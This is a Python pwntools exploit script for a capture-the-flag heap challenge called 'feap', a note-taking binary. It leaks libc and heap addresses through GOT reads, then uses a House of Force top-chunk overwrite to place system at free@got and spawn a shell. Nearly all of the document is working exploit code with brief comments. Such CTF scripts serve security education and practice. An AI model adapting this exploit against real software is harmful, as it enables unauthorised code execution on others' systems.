#stripped partial relro no pie
# as pie is disabled we can easily leak the addr at free@got....prdeict the addr

from pwn import *
from Crypto.Util.number import *

r = process("./feap")

def add(size,title,body):
	r.sendlineafter(">",str(1))
	r.sendlineafter("Enter note body size:",str(size))
	r.sendlineafter("Please Enter note title (MAX 63):",title)
	r.sendlineafter("):",body)

def delete(idx):
	r.sendlineafter(">",str(2))
	r.sendlineafter("Please enter note id to delete:",str(idx))

def edit(part,content,id):
	r.sendlineafter(">",str(3))
	r.sendlineafter("Please enter note id to edit:",str(id))
	r.sendlineafter("1 for edit title, 2 for edit body:",str(part))

	if(part == 1):
		r.sendlineafter("Please enter note title:",content)

	else:
		r.sendlineafter("Please enter note body:",content)

def print_all():
	r.sendlineafter(">",str(4))
	r.recvall() #tbm

def print_(idx):
	r.sendlineafter(">",str(5))
	r.sendlineafter("print:",str(idx))
	
def exit_():
	r.sendlineafter(">",str(6))

puts_got = 0x000000000602020
free_got = 0x000000000602018
malloc_got = 0x000000000602060

#libc leak
add(puts_got-64,'a'*16,'b'*16)
add(32,'/bin/sh\x00','/bin//sh')
print_(22)
print(r.recvline())
leak1 = u64(r.recvline().strip()[7:].ljust(8,'\x00'))
system = leak1 - 0x2a300
print(r.recvline())
print(hex(leak1))

#heap leak
notes = 0x00000000006020A8
add(notes-64,'c'*16,'d'*16)
print_(24)
print(r.recvline())
heap_leak = u64(r.recvline().strip()[7:].ljust(8,'\x00'))
#system = leak1 - 0x2a300
print(r.recvline())
print(hex(heap_leak))

add(0x30,'e'*16,'f'*16)
edit(2,'f'*56+p64(0xffffffffffffffff),3)

top_chunk = heap_leak+0x1260
print(hex(top_chunk))
new_block = free_got - top_chunk -64-0x10
print(hex(new_block))
add(new_block,'','')

add(0x20,'\x00'*8+p64(system)+p64(leak1),'')
gdb.attach(r)
r.interactive()

#delete a valid chunk